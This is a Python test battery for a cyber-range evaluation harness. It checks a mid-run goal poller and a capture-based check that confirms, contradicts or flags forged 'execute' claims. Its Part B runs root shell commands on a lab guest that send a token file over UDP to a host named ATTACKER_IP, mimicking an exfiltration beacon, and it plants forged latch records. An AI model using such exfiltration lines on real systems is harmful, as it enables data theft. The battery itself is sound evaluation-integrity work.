#!/usr/bin/env python3
"""challenges-v1 slice-5 battery: the mid-run poller and `corroborate()` on live ranges.

Run via ./run_poller.sh (golden staged, INSPECT_RANGES_POLL_S=1, shared battery flock). Two parts:

Part A, a real `inspect eval` (two samples, each booting its own range): `mid` proves the poller latches a pass MID-RUN at its cheap tier (the latch wall precedes a marker the solver stamps before the run's second half; the end-of-run scorer agrees idempotently) and the timing surface lands in the eval log's sample store; `injury` stops the poller mid-run (the public stop, simulating poller death) and the sample's outcome is unaffected.

Part B, a direct boot at CID 30800 with capture on: a REAL beacon flow confirms a corroborated execute pass; a forged `corroborated=True` latch over the complete capture CONTRADICTS and the Score goes invalid; killing the capture sidecar opens an honest gap, and the same forged claim over the gapped window flags incomplete with the score UNCHANGED (gaps never fail a passing sample). The measurement table prints per-goal and per-stage timings plus corroborate scan time against evidence bytes.
"""

import asyncio
import json
import logging
import os
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

SPIKE = Path(__file__).resolve().parent
sys.path.insert(0, str(SPIKE.parent.parent.parent / "src"))

from inspect_ai import Task  # noqa: E402
from inspect_ai import eval as inspect_eval  # noqa: E402
from inspect_ai.log import EvalLog  # noqa: E402
from inspect_ai.solver import Generate, Solver, TaskState, solver  # noqa: E402
from inspect_ai.util import Store, store  # noqa: E402
from inspect_ranges._challenges.dataset import challenge_dataset  # noqa: E402
from inspect_ranges._challenges.engine import (  # noqa: E402
    LATCHES_STORE_KEY,
    LatchRecord,
)
from inspect_ranges._challenges.oracle import RangeOracle, range_oracle  # noqa: E402
from inspect_ranges._challenges.poller import stop_goal_poller  # noqa: E402
from inspect_ranges._challenges.schema import Challenge  # noqa: E402
from inspect_ranges._challenges.scorer import (  # noqa: E402
    challenge_scorer,
    score_challenge,
)
from inspect_ranges._challenges.setup import plant_goals, run_setup  # noqa: E402
from inspect_ranges._challenges.submission import (  # noqa: E402
    SUBMISSIONS_STORE_KEY,
    Submissions,
)
from inspect_ranges._challenges.timings import (  # noqa: E402
    TIMINGS_STORE_KEY,
    render_timing_table,
    timings_snapshot,
)
from inspect_ranges._channel.channel import MessageChannel  # noqa: E402
from inspect_ranges._channel.vsock import VsockTransport  # noqa: E402
from inspect_ranges._compiler import PlanOptions, render_bundle  # noqa: E402
from inspect_ranges._compiler.plan import Totals  # noqa: E402
from inspect_ranges._provider.evidence import EvidenceSession  # noqa: E402
from inspect_ranges._provider.state import SampleHandle  # noqa: E402
from inspect_ranges._runtime.down import down  # noqa: E402
from inspect_ranges._runtime.up import UpOptions, up  # noqa: E402
from inspect_ranges.schema import load_range  # noqa: E402

TMP = SPIKE / "tmp"
BUNDLE = TMP / "bundle-poller"
EVIDENCE = TMP / "evidence-poller"
IMAGE_CACHE = Path(os.environ["INSPECT_RANGES_IMAGE_CACHE"])
MARKER_KEY = "battery:mid-marker"
ATTACKER_IP = "10.95.10.3"

PASS = 0
FAIL = 0


def check(condition: bool, name: str) -> bool:
    global PASS, FAIL
    if condition:
        PASS += 1
        print(f"PASS  {name}", flush=True)
    else:
        FAIL += 1
        print(f"FAIL  {name}", flush=True)
    return condition


def _submit(goal_id: str, value: str) -> None:
    entries: list[dict[str, object]] = list(store().get(SUBMISSIONS_STORE_KEY, []))
    entries.append({"goal_id": goal_id, "value": value, "wall": time.time()})
    store().set(SUBMISSIONS_STORE_KEY, entries)


@solver
def battery_solver() -> Solver:
    async def solve(state: TaskState, generate: Generate) -> TaskState:
        sample = str(state.sample_id)
        oracle = range_oracle()
        early = oracle.store.get("flag:early").decode()
        late = oracle.store.get("flag:late").decode()
        if sample == "mid":
            _submit("early", early)
            # three poll windows at POLL_S=1: the poller must latch BEFORE the
            # marker below, which precedes the second submission and run end
            await asyncio.sleep(3.5)
            store().set(MARKER_KEY, time.time())
            _submit("late", late)
        elif sample == "injury":
            await stop_goal_poller(state.store)  # the poller dies mid-run
            _submit("early", early)
            _submit("late", late)
        return state

    return solve


def part_a() -> None:
    print("=== part A: real eval (poller mid-run latch + injury) ===", flush=True)
    spec = SPIKE / "spec.yaml"
    task = Task(
        dataset=challenge_dataset(str(SPIKE / "poller-challenges.yaml"), str(spec)),
        solver=[plant_goals(), battery_solver()],
        scorer=challenge_scorer(),
        sandbox=("libvirt_range", str(spec)),
    )
    started = time.monotonic()
    logs: list[EvalLog] = inspect_eval(
        task,
        model="mockllm/model",
        log_dir=str(TMP / "logs" / "eval-poller"),
        max_samples=1,
        fail_on_error=False,
    )
    wall = time.monotonic() - started
    log = logs[0]
    check(log.status == "success", f"eval completed ({wall:.1f}s for 2 samples)")
    samples = {str(s.id): s for s in (log.samples or [])}

    mid = samples.get("mid")
    mid_score = (mid.scores or {}).get("challenge_scorer") if mid else None
    check(mid_score is not None, "mid: scored")
    if mid is not None and mid_score is not None:
        check(mid_score.value == 1.0, "mid: both goals score 1.0")
        check(mid_score.metadata["validity"] == "valid", "mid: validity valid")
        store_state: dict[str, Any] = mid.store or {}
        latches = store_state.get(LATCHES_STORE_KEY, {})
        marker = float(store_state.get(MARKER_KEY, 0.0))
        early_record = LatchRecord.model_validate(latches["early"])
        check(
            early_record.achieved and 0.0 < early_record.wall < marker,
            f"mid: poller latched early MID-RUN (wall {early_record.wall:.3f} "
            f"< marker {marker:.3f})",
        )
        timings = store_state.get(TIMINGS_STORE_KEY, {})
        ticks = timings.get("sample", {}).get("poller-tick", {})
        check(
            int(ticks.get("n", 0)) >= 2,
            f"mid: timing surface in the eval log (poller ticks n={ticks.get('n')})",
        )
        check(
            "corroboration" in mid_score.metadata,
            "mid: corroboration section in score metadata",
        )
        print("--- mid timing table (from the eval log) ---")
        print(render_timing_table(timings))

    injury = samples.get("injury")
    injury_score = (injury.scores or {}).get("challenge_scorer") if injury else None
    check(injury_score is not None, "injury: scored")
    if injury_score is not None:
        check(
            injury_score.value == 1.0 and injury_score.metadata["validity"] == "valid",
            "injury: poller death never alters the sample outcome",
        )


async def sh(oracle: RangeOracle, guest: str, command: str) -> int:
    # bash, not sh: /dev/udp redirections are a bash feature (sh is dash here)
    outcome = await oracle.exec(
        guest, ["bash", "-c", command], user="root", timeout_s=60.0
    )
    return outcome.rc


def execute_challenge(goal_id: str, token_path: str) -> Challenge:
    return Challenge.model_validate(
        {
            "id": f"corr-{goal_id}",
            "prompt": "p",
            "goals": [
                {
                    "id": goal_id,
                    "type": "execute",
                    "host": "web",
                    "service_user": "root",
                    "token_path": token_path,
                    "beacon_segment": "dmz",
                }
            ],
        }
    )


def forged_latch(store_obj: Store, goal_id: str) -> None:
    store_obj.set(
        LATCHES_STORE_KEY,
        {
            goal_id: LatchRecord(
                achieved=True,
                corroborated=True,
                wall=time.time(),
                assurance="guest-corroborated",
                primitive="execute",
                elapsed_s=0.0,
            ).model_dump(mode="json")
        },
    )


async def part_b() -> None:
    print("=== part B: corroborate on a live range (CID 30800) ===", flush=True)
    spec = load_range(SPIKE / "spec.yaml")
    plan = render_bundle(
        spec,
        BUNDLE,
        PlanOptions(image_cache=IMAGE_CACHE, cid_base=30800, evidence_capture=True),
    )
    session = EvidenceSession(str(EVIDENCE), sample_id="chv1-corr", capture_local=True)
    result = await asyncio.to_thread(
        up,
        BUNDLE,
        UpOptions(image_cache=IMAGE_CACHE),
        on_stage=session.recorder.on_stage,
    )
    project = result.project
    check(all(g.ready for g in result.guests), f"range up: {project}")
    boot = json.loads((BUNDLE / "boot.json").read_text())
    cids = {g["name"]: int(g["cid"]) for g in boot["guests"]}
    channel = MessageChannel(
        VsockTransport(cids), label="chv1-corr", channel_budget_s=10.0
    )
    await session.open(lease_id=None, project=project, bundle=BUNDLE, plan=plan)
    check(session.enabled, "evidence session open")
    handle = SampleHandle(
        project=project,
        task_name="chv1-corr",
        staging=TMP / "staging-poller",
        totals=Totals(guests=4, cpus=4, memory_mb=4096),
        cid_base=30800,
        guest_cids=cids,
        channel=channel,
        evidence=session,
        plan=plan,
    )
    oracle = RangeOracle(handle)
    try:
        # B1: real beacon -> confirmed
        challenge_one = execute_challenge("real", "/var/tmp/corr-token")
        store_one = Store()
        await run_setup(oracle, challenge_one, store_one)
        token = oracle.store.get("execute:real").decode()
        rc = await sh(
            oracle, "web", f"cat /var/tmp/corr-token > /dev/udp/{ATTACKER_IP}/4455"
        )
        check(rc == 0, "B1: beacon emitted from web (token via UDP, path-only argv)")
        # datagram-sized noise (a single multi-MB UDP write would EMSGSIZE):
        # ~2.4 MB total forces rotation + ship at CAPTURE_CHUNK_MB=1
        rc = await sh(
            oracle,
            "web",
            "for i in $(seq 1 40); do "
            f"head -c 60000 /dev/urandom > /dev/udp/{ATTACKER_IP}/4456; done",
        )
        check(rc == 0, "B1: rotation noise pushed across dmz")
        await asyncio.sleep(4.0)
        store_one.set(
            SUBMISSIONS_STORE_KEY,
            [{"goal_id": "real", "value": token, "wall": time.time()}],
        )
        value, metadata = await score_challenge(
            oracle,
            store_one,
            challenge_one,
            submissions_for(store_one, challenge_one),
        )
        corr = metadata["corroboration"]
        check(
            value == 1.0 and metadata["validity"] == "valid",
            "B1: corroborated pass scores 1.0 valid",
        )
        check(
            corr["verdicts"].get("real") == "confirmed",
            f"B1: claim re-verified from the sealed capture ({corr['verdicts']})",
        )
        check(
            int(corr["scanned_bytes"]) > 0 and float(corr["scan_s"]) < 60.0,
            f"B1: scan {corr['scanned_bytes']}B in {corr['scan_s']:.3f}s "
            "(measure-first row; nowhere near the fifteen-minute gate)",
        )

        # B2: forged claim over COMPLETE capture -> contradiction -> invalid
        challenge_two = execute_challenge("forged", "/var/tmp/corr-token2")
        store_two = Store()
        await run_setup(oracle, challenge_two, store_two)
        token_two = oracle.store.get("execute:forged").decode()
        forged_latch(store_two, "forged")
        store_two.set(
            SUBMISSIONS_STORE_KEY,
            [{"goal_id": "forged", "value": token_two, "wall": time.time()}],
        )
        # post-forge rotation noise: coverage must provably REACH the forged
        # claim's wall, or the completeness rule (correctly) reads the claim
        # as unverifiable instead of contradicted
        rc = await sh(
            oracle,
            "web",
            "for i in $(seq 1 40); do "
            f"head -c 60000 /dev/urandom > /dev/udp/{ATTACKER_IP}/4457; done",
        )
        check(rc == 0, "B2: post-forge coverage noise pushed")
        await asyncio.sleep(4.0)
        await asyncio.sleep(2.0)
        value, metadata = await score_challenge(
            oracle, store_two, challenge_two, submissions_for(store_two, challenge_two)
        )
        check(
            value == 1.0
            and metadata["validity"] == "invalid"
            and metadata["corroboration"]["verdicts"].get("forged") == "contradicted",
            "B2: forged corroboration claim over complete capture -> INVALID",
        )

        # B3: kill the capture sidecar -> honest gap -> incomplete, score unchanged
        kill = subprocess.run(
            ["docker", "kill", f"{project}-capture-1"],
            capture_output=True,
            text=True,
        )
        check(
            kill.returncode == 0, f"B3: capture sidecar killed ({kill.stdout.strip()})"
        )
        await asyncio.sleep(
            8.0
        )  # the streamer notices, gaps, and coverage provably ends
        challenge_three = execute_challenge("gapped", "/var/tmp/corr-token3")
        store_three = Store()
        await run_setup(oracle, challenge_three, store_three)
        token_three = oracle.store.get("execute:gapped").decode()
        forged_latch(store_three, "gapped")
        store_three.set(
            SUBMISSIONS_STORE_KEY,
            [{"goal_id": "gapped", "value": token_three, "wall": time.time()}],
        )
        value, metadata = await score_challenge(
            oracle,
            store_three,
            challenge_three,
            submissions_for(store_three, challenge_three),
        )
        corr = metadata["corroboration"]
        check(
            value == 1.0 and metadata["validity"] == "valid",
            "B3: gap leaves the score UNCHANGED (gaps never fail a passing sample)",
        )
        check(
            corr["incomplete"] is True
            and corr["verdicts"].get("gapped") == "unverifiable",
            f"B3: claim unverifiable over the gapped window ({corr['verdicts']})",
        )

        print("--- part B timing tables ---")
        for name, st in (("B1", store_one), ("B2", store_two), ("B3", store_three)):
            print(f"[{name}]")
            print(render_timing_table(timings_snapshot(st)))
    finally:
        await session.finalize()
        await asyncio.to_thread(down, project)


def submissions_for(store_obj: Store, challenge: Challenge) -> Submissions:
    """Raw-store submissions view (no TaskState in part B)."""
    from inspect_ranges._challenges.submission import Submission

    raw: list[dict[str, Any]] = store_obj.get(SUBMISSIONS_STORE_KEY, [])
    return Submissions(
        [
            Submission(
                goal_id=str(entry["goal_id"]),
                value=str(entry["value"]),
                wall=float(entry["wall"]),
            )
            for entry in raw
        ]
    )


def main() -> int:
    logging.basicConfig(
        level=logging.WARNING, format="%(levelname)s %(name)s %(message)s"
    )
    logging.getLogger("inspect_ranges.challenges").setLevel(logging.INFO)
    part_a()
    asyncio.run(part_b())
    failed = FAIL
    print(f"\n{PASS} passed, {failed} failed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
